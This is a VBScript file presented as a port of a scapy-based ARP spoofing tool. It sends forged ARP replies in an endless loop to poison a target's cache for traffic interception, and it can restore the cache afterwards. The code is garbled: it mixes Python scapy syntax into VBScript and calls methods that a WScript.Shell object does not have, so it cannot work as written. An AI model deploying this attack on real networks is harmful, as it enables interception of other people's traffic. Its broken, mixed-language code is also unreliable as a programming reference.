'ARP_Spoof.vbs - Credit to SHathi28 I'm just a loser porting useful scripts to VBScript

Const TARGET_IP = "Target_IP"
Const SOURCE_IP = "Source_IP"

Dim shell
Set shell = WScript.CreateObject("WScript.Shell")
Dim scapy
Set scapy = WScript.CreateObject("WScript.Shell")

Function Restore(dstIP, srcIP)
    Dim dstMAC, srcMAC, packet
    dstMAC = GetTargetMac(dstIP)
    srcMAC = GetTargetMac(srcIP)
    packet = scapy.ARP("2", dstIP, dstMAC, srcIP, srcMAC)
    scapy.Run("send " & packet & " verbose=False")
    Restore = True
End Function

Function GetTargetMac(ip)
    Dim arp_request, broadcast, finalPacket, answer, mac
    Set arp_request = scapy.ARP(pdst=ip)
    Set broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    Set finalPacket = broadcast/arp_request
    Set answer = scapy.srp(finalPacket, timeout=2, verbose=False)(0)
    mac = answer(0)(1).hwsrc
    GetTargetMac = mac
End Function

Function SpoofARP(target_ip, spoofed_ip)
    Dim mac, packet
    mac = GetTargetMac(target_ip)
    packet = scapy.ARP("2", mac, target_ip, spoofed_ip)
    scapy.Run("send " & packet & " verbose=False")
    SpoofARP = True
End Function

Sub Main()
    On Error Resume Next
    Dim i
    While True
        For i = 1 To 255
            SpoofARP TARGET_IP, SOURCE_IP
        Next
    Wend
    If Err.Number <> 0 Then
        WScript.Echo "[!] Program Interrupted"
        Restore TARGET_IP, SOURCE_IP
        WScript.Quit
    End If
End Sub

Main()
